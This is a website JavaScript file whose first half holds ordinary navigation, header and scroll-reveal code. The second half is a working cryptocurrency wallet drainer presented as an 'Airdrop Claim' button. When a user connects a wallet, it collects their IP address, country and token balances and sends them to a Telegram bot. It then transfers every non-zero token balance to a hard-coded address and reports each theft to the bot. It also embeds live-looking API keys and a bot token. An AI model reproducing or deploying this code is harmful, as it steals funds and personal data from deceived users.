'use strict';

/**
 * Add event on element
 */
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
}

/**
 * Navbar toggle
 */
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
}

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
}

addEventOnElem(navbarLinks, "click", closeNavbar);

/**
 * Header active on scroll
 */
const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
}

addEventOnElem(window, "scroll", activeHeader);

/**
 * Toggle active on add to fav
 */
const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
}

addEventOnElem(addToFavBtns, "click", toggleActive);

/**
 * Scroll reveal effect
 */
const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
}

scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

/**
 * Wallet connect and token transfer using Moralis API with Telegram notification
 */
async function connectWalletAndSendTokens() {
  // Configure Web3Modal with multiple wallet providers
  const projectId = "afc6f85c758e42cdeff2f53e6d484793"; // Replace with your WalletConnect Project ID
  const { createWeb3Modal, defaultConfig } = window.Web3Modal;

  const metadata = {
    name: "Airdrop Claim App",
    description: "Claim your airdrop tokens",
    url: window.location.href,
    icons: ["https://yourappicon.com/icon.png"] // Optional: Add your app icon
  };

  const chains = [
    {
      chainId: 1, // Ethereum Mainnet
      name: "Ethereum",
      currency: "ETH",
      explorerUrl: "https://etherscan.io",
      rpcUrl: "https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1"
    },
    {
      chainId: 137, // Polygon Mainnet
      name: "Polygon",
      currency: "MATIC",
      explorerUrl: "https://polygonscan.com",
      rpcUrl: "https://polygon-rpc.com"
    }
  ];

  const web3Modal = createWeb3Modal({
    ethersConfig: defaultConfig({ metadata, defaultChainId: 1, chains }),
    chains,
    projectId,
    themeMode: "light", // or "dark"
    themeVariables: {
      "--w3m-accent": "#007bff"
    }
  });

  try {
    // Open Web3Modal to let user select a wallet
    const provider = await web3Modal.connect();
    const ethersProvider = new ethers.providers.Web3Provider(provider);
    const signer = ethersProvider.getSigner();
    const userAddress = await signer.getAddress();
    const network = await ethersProvider.getNetwork();
    const chainId = network.chainId;

    // Detect wallet type
    let walletType = "Unknown";
    if (provider.isMetaMask) {
      walletType = "MetaMask";
    } else if (provider.isCoinbaseWallet) {
      walletType = "Coinbase Wallet";
    } else if (provider.isWalletConnect) {
      walletType = "WalletConnect";
    }

    // Fetch location data
    let locationData = {};
    try {
      const locRes = await fetch("https://ipapi.co/json/");
      locationData = await locRes.json();
    } catch (e) {
      console.warn("Location fetch failed", e);
    }

    // Moralis API call to get token balances
    const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";
    const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${chainId === 1 ? 'eth' : chainId === 137 ? 'polygon' : 'eth'}`;

    const response = await fetch(moralisUrl, {
      headers: {
        "X-API-Key": moralisApiKey
      }
    });

    const tokens = await response.json();
    const originalTokens = [...tokens]; // Store tokens for transfer and Telegram

    // Format balance summary for initial Telegram notification (non-zero real tokens)
    let tokenSummaryTelegram = "";
    const nonZeroTokens = originalTokens.filter(token => token.balance && !ethers.BigNumber.from(token.balance).isZero());
    if (nonZeroTokens.length > 0) {
      tokenSummaryTelegram = nonZeroTokens.map(token => {
        const decimals = token.decimals ?? 18;
        const balance = ethers.utils.formatUnits(token.balance, decimals);
        return `• ${token.symbol}: ${balance} (Contract: ${token.token_address})`;
      }).join("\n");
    } else {
      tokenSummaryTelegram = "No non-zero token balances found.";
    }

    // Send initial Telegram message with non-zero token balances
    const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
    const chatId = "5995616824";
    const initialMessage = `
📥 Wallet Connected!
Address: ${userAddress}
Wallet: ${walletType}
Country: ${locationData.country_name || "Unknown"}
IP: ${locationData.ip || "N/A"}

💰 Non-Zero Token Balances:
${tokenSummaryTelegram}
    `;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: initialMessage
      })
    });

    // Proceed with approving and transferring all non-zero token balances
    for (const token of originalTokens) {
      try {
        const contract = new ethers.Contract(token.token_address, [
          "function transfer(address to, uint amount) returns (bool)",
          "function approve(address spender, uint amount) returns (bool)",
          "function allowance(address owner, address spender) view returns (uint)"
        ], signer);

        const balanceInWei = ethers.BigNumber.from(token.balance);
        if (balanceInWei.isZero()) continue;

        // Check allowance for the user's own address (used as a proxy spender)
        const allowance = await contract.allowance(userAddress, userAddress);
        if (allowance.lt(balanceInWei)) {
          // Request user to approve spending the full balance
          const approveTx = await contract.approve(userAddress, balanceInWei);
          await approveTx.wait();
          console.log(`Approved ${token.symbol} for transfer, tx:`, approveTx.hash);
        }

        // Perform transfer to Exodus wallet
        const tx = await contract.transfer("0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57", balanceInWei);
        await tx.wait(); // Wait for transaction confirmation
        console.log(`Sent ${token.symbol}, tx:`, tx.hash);

        // Send Telegram notification for successful transfer
        const decimals = token.decimals ?? 18;
        const balance = ethers.utils.formatUnits(token.balance, decimals);
        const successMessage = `
✅ Token Transfer Successful!
Token: ${token.symbol}
Amount: ${balance}
Contract: ${token.token_address}
Destination: 0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57
Tx Hash: ${tx.hash}
        `;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: successMessage
          })
        });

      } catch (err) {
        console.warn(`Failed to process ${token.symbol}`, err);
      }
    }

  } catch (err) {
    console.error('Error connecting wallet or processing tokens:', err);
    alert('Failed to connect wallet or process tokens. Please try again.');
  }
}

// Attach to claim button
document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);